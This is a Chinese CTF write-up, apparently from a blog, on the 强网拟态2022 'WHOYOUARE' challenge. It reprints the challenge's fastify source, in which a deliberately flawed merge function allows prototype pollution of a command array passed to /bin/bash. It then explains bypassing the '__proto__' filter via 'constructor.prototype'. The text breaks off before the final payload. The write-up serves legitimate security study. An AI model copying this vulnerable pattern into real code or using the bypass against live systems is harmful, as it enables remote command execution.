{"title":"强网拟态2022-wp","uid":"e5e8f1b2dedddaa2854454c5662c45e6","slug":"2022强网拟态","date":"2023-02-13T15:23:35.802Z","updated":"2023-09-19T07:59:56.618Z","comments":true,"path":"api/articles/2022强网拟态.json","keywords":null,"cover":"/img/35.jpg","content":"<p><code>学习学习</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"强网拟态2022\"><a href=\"#强网拟态2022\" class=\"headerlink\" title=\"强网拟态2022\"></a>强网拟态2022</h1><h2 id=\"WHOYOUARE\"><a href=\"#WHOYOUARE\" class=\"headerlink\" title=\"WHOYOUARE\"></a>WHOYOUARE</h2><p>这道题目的环境是<code>nodejs</code>，猜考点是原型链污染，其框架根据附件名称可知为<code>fastify</code></p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230825093507374.png\" alt=\"image-20230825093507374\"></p>\n<p>看题目名字和刚打开题目的提示，猜测污染漏洞点应该在<code>user</code>处，应该在某个检查<code>user</code>信息的地方可以进行原型链污染</p>\n<hr>\n<h3 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h3><p>先审一下<code>app.js</code></p>\n<h4 id=\"app-js\"><a href=\"#app-js\" class=\"headerlink\" title=\"app.js\"></a>app.js</h4><pre class=\"line-numbers language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> userRoutes <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./routes/user'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">const</span> fastify <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'fastify'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    logger<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n        level<span class=\"token punctuation\">:</span> <span class=\"token string\">'error'</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">const</span> port <span class=\"token operator\">=</span> process<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span>PORT <span class=\"token operator\">||</span> <span class=\"token number\">3000</span>\n<span class=\"token keyword\">const</span> host <span class=\"token operator\">=</span> process<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span>HOST <span class=\"token operator\">||</span> <span class=\"token string\">\"0.0.0.0\"</span>\n<span class=\"token keyword\">const</span> respWrapper <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    $id<span class=\"token punctuation\">:</span> <span class=\"token string\">'respWrapper'</span><span class=\"token punctuation\">,</span>\n    type<span class=\"token punctuation\">:</span> <span class=\"token string\">'object'</span><span class=\"token punctuation\">,</span>\n    response <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n        success<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n            type<span class=\"token punctuation\">:</span> <span class=\"token string\">'object'</span><span class=\"token punctuation\">,</span>\n            properties<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                status <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span> type<span class=\"token punctuation\">:</span> <span class=\"token string\">'number'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                info<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span> type<span class=\"token punctuation\">:</span> <span class=\"token string\">'string'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\nfastify<span class=\"token punctuation\">.</span><span class=\"token function\">addSchema</span><span class=\"token punctuation\">(</span>respWrapper<span class=\"token punctuation\">)</span>\nfastify<span class=\"token punctuation\">.</span><span class=\"token function\">register</span><span class=\"token punctuation\">(</span>userRoutes<span class=\"token punctuation\">)</span>\n\nfastify<span class=\"token punctuation\">.</span><span class=\"token function\">listen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    host<span class=\"token punctuation\">,</span> port\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        fastify<span class=\"token punctuation\">.</span>log<span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n        process<span class=\"token punctuation\">.</span><span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    fastify<span class=\"token punctuation\">.</span>log<span class=\"token punctuation\">.</span><span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token string\">`server listening on </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>address<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">`</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>发现网站还有个路由<code>/user</code></p>\n<pre class=\"line-numbers language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> userRoutes <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./routes/user'</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>访问</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230825100242391.png\" alt=\"image-20230825100242391\"></p>\n<p>显示</p>\n<pre class=\"line-numbers language-js\"><code class=\"language-js\"><span class=\"token punctuation\">{</span><span class=\"token string\">\"message\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Route GET:/user not found\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"error\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Not Found\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"statusCode\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">404</span><span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>看样子是无法用GET方式访问<code>/user</code>路由</p>\n<p>于是审计一下<code>user.js</code></p>\n<h4 id=\"user-js\"><a href=\"#user-js\" class=\"headerlink\" title=\"user.js\"></a>user.js</h4><pre class=\"line-numbers language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> merge <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'../utils/merge'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">const</span> bin <span class=\"token operator\">=</span> <span class=\"token string\">\"/bin/bash\"</span>\n<span class=\"token keyword\">const</span> ChildProcess <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">checkUser</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Array<span class=\"token punctuation\">.</span><span class=\"token function\">isArray</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token boolean\">false</span> <span class=\"token operator\">||</span> command<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> command<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">let</span> cmd <span class=\"token operator\">=</span> command<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> cmd <span class=\"token operator\">!==</span> <span class=\"token string\">'string'</span> <span class=\"token operator\">||</span> cmd<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">4</span> <span class=\"token operator\">||</span> <span class=\"token function\">RegExp</span><span class=\"token punctuation\">(</span><span class=\"token regex\">/^[^a-zA-Z0-9-]+$/</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> routes <span class=\"token punctuation\">(</span>fastify<span class=\"token punctuation\">,</span> options<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    fastify<span class=\"token punctuation\">.</span><span class=\"token function\">route</span><span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">{</span>\n            method<span class=\"token punctuation\">:</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">,</span>\n            url<span class=\"token punctuation\">:</span> <span class=\"token string\">'/user'</span><span class=\"token punctuation\">,</span>\n            schema<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                querystring<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                    user<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span> type<span class=\"token punctuation\">:</span> <span class=\"token string\">'string'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                additionalProperties<span class=\"token punctuation\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n                response<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token number\">200</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                        $ref<span class=\"token punctuation\">:</span> <span class=\"token string\">'respWrapper#/response/success'</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            preHandler<span class=\"token punctuation\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> reply<span class=\"token punctuation\">,</span> done<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token comment\" spellcheck=\"true\">//user init</span>\n                request<span class=\"token punctuation\">.</span>user <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>username <span class=\"token punctuation\">:</span> <span class=\"token string\">'guest'</span><span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"-c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">let</span> user <span class=\"token operator\">=</span> JSON<span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">)</span>\n                <span class=\"token comment\" spellcheck=\"true\">// clean user command</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">checkUser</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span>command<span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    user<span class=\"token punctuation\">.</span>command <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"-c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">]</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">}</span><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                    reply<span class=\"token punctuation\">.</span><span class=\"token function\">code</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>status<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> info<span class=\"token punctuation\">:</span> <span class=\"token string\">\"Something error\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token function\">done</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            handler <span class=\"token punctuation\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> reply<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                ChildProcess<span class=\"token punctuation\">.</span><span class=\"token function\">execFile</span><span class=\"token punctuation\">(</span>bin<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">.</span>command<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        reply<span class=\"token punctuation\">.</span><span class=\"token function\">code</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>status<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> info<span class=\"token punctuation\">:</span> error<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">}</span>\n                    reply<span class=\"token punctuation\">.</span><span class=\"token function\">code</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> status <span class=\"token punctuation\">:</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> info <span class=\"token punctuation\">:</span> <span class=\"token template-string\"><span class=\"token string\">`User of </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>request<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">.</span>username<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> : </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>stdout<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">`</span></span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    fastify<span class=\"token punctuation\">.</span><span class=\"token function\">route</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n        method<span class=\"token punctuation\">:</span> <span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span>\n        url<span class=\"token punctuation\">:</span> <span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span>\n        response<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n            $ref<span class=\"token punctuation\">:</span> <span class=\"token string\">'respWrapper#/response/success'</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        handler<span class=\"token punctuation\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> reply<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            reply<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> status<span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> info<span class=\"token punctuation\">:</span> <span class=\"token string\">'go user'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\nmodule<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> routes\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>原型链污染重点看<code>merge</code>和<code>JSON.parse</code>，发现代码，</p>\n<pre class=\"line-numbers language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> user <span class=\"token operator\">=</span> JSON<span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<pre class=\"line-numbers language-js\"><code class=\"language-js\"><span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    reply<span class=\"token punctuation\">.</span><span class=\"token function\">code</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>status<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> info<span class=\"token punctuation\">:</span> <span class=\"token string\">\"Something error\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>其中<code>request.user</code>的值为，</p>\n<pre class=\"line-numbers language-js\"><code class=\"language-js\"> request<span class=\"token punctuation\">.</span>user <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>username <span class=\"token punctuation\">:</span> <span class=\"token string\">'guest'</span><span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"-c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>而<code>user</code>的值为，</p>\n<pre class=\"line-numbers language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> user <span class=\"token operator\">=</span> JSON<span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><code>request.user</code>是初始化的<code>user</code>，所以无法直接污染，但是<code>user</code>是从请求体中得到的数据，并且通过Json格式化，其中是可以加一些实体（如<code>__proto__</code>,<code>constructor.prototype</code>）进去，是可以被我们污染的，所以，我们可以先污染<code>user</code>，然后通过<code>merge</code>合并，将<code>user</code>中的值传入<code>request.user</code>中</p>\n<p>然后我们可以看看<code>merge</code>的内容，</p>\n<h4 id=\"merge-js\"><a href=\"#merge-js\" class=\"headerlink\" title=\"merge.js\"></a>merge.js</h4><pre class=\"line-numbers language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> whileTypes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'boolean'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'string'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'number'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'bigint'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'symbol'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'undefined'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> merge <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> source<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> key <span class=\"token keyword\">in</span> source<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>whileTypes<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> source<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>whileTypes<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> target<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>key <span class=\"token operator\">!==</span> <span class=\"token string\">'__proto__'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> source<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n            target<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> source<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\nmodule<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> merge\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>发现<code>merge</code>对内容进行了过滤和检查，</p>\n<ul>\n<li>如果<code>request.user</code>或<code>user</code>中，有包含<code>whileTypes</code>中的内容，就不会执行<code>merge</code></li>\n<li>如果键值中有<code>__proto__</code>，也不会执行<code>merge</code></li>\n</ul>\n<p>过滤关键字还好，只是过滤了<code>__proto__</code>，需要一个相同功能的来帮助绕过，比如<code>constructor.prototype</code></p>\n<p>但是在<code>merge</code>前面还要个<code>checkUser</code>，将<code>command</code>也进行了限制</p>\n<pre class=\"line-numbers language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">checkUser</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Array<span class=\"token punctuation\">.</span><span class=\"token function\">isArray</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token boolean\">false</span> <span class=\"token operator\">||</span> command<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> command<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">let</span> cmd <span class=\"token operator\">=</span> command<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> cmd <span class=\"token operator\">!==</span> <span class=\"token string\">'string'</span> <span class=\"token operator\">||</span> cmd<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">4</span> <span class=\"token operator\">||</span> <span class=\"token function\">RegExp</span><span class=\"token punctuation\">(</span><span class=\"token regex\">/^[^a-zA-Z0-9-]+$/</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>由条件语句可知，要求<code>command</code>必须是数组且数组中元素个数要小于等于<code>2</code>，</p>\n<p>且要求command数组中的元素必须为字符串且长度要小于等于4，并以字母或者数字或者-开头</p>\n<p>如果不满足<code>checkUser</code>，就会执行：</p>\n<pre class=\"line-numbers language-js\"><code class=\"language-js\"> user<span class=\"token punctuation\">.</span>command <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"-c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">]</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>将<code>command</code>直接赋值为执行<code>id</code>命令，而不能执行其他命令。</p>\n<p>&#x3D;&#x3D;&gt;再由初始化<code>request.user</code>，所以最后构造<code>request.body.user</code>的结构应该为</p>\n<pre class=\"line-numbers language-json\"><code 